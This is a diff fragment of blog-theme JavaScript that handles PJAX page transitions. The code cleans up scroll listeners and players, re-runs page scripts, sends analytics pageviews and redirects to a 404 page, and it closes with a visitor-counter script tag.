+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
